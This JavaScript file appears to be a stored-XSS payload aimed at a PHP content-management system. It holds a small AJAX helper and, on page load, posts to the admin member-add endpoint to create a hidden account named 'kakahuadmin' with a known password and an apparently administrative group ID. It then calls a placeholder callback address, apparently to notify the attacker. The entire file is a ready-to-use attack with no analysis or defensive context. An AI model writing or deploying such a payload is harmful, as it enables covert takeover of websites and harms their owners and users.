var pkav = {
    ajax: function() {
        var xmlHttp;
        try {
            xmlHttp = new XMLHttpRequest();
        } catch (e) {
            try {
                xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
            } catch (e) {
                try {
                    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
                } catch (e) {
                    return false;
                }
            }
        }
        return xmlHttp;
    },
    req: function(url, data, method, callback) {
        method = (method || "").toUpperCase();
        method = method || "GET";
        data = data || "";
        if (url) {
            var a = this.ajax();
            a.open(method, url, true);
            if (method == "POST") {
                a.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            }
            a.onreadystatechange = function() {
                if (a.readyState == 4 && a.status == 200) {
                    if (callback) {
                        callback(a.responseText);
                    }
                }
            };
            if ((typeof data) == "object") {
                var arr = [];
                for (var i in data) {
                    arr.push(i + "=" + encodeURIComponent(data[i]));
                }
                a.send(arr.join("&"));
            } else {
                a.send(data || null);
            }
        }
    },
    get: function(url, callback) {
        this.req(url, "", "GET", callback);
    },
    post: function(url, data, callback) {
        this.req(url, data, "POST", callback);
    }
};
if (!window.__x) {
    pkav.post("/admin/index.php?lfj=member&action=addmember", "postdb%5Busername%5D=kakahuadmin&postdb%5Bpasswd%5D=kakahuadmin&postdb%5Bpasswd2%5D=kakahuadmin&postdb%5Bgroupid%5D=3&postdb%5Bemail%5D=kakahuadmin%40qq.com&Submit=%CC%E1%BD%BB", function(rs) {});
    pkav.get("接口地址", function(rs) {});
    window.__x = 1;
}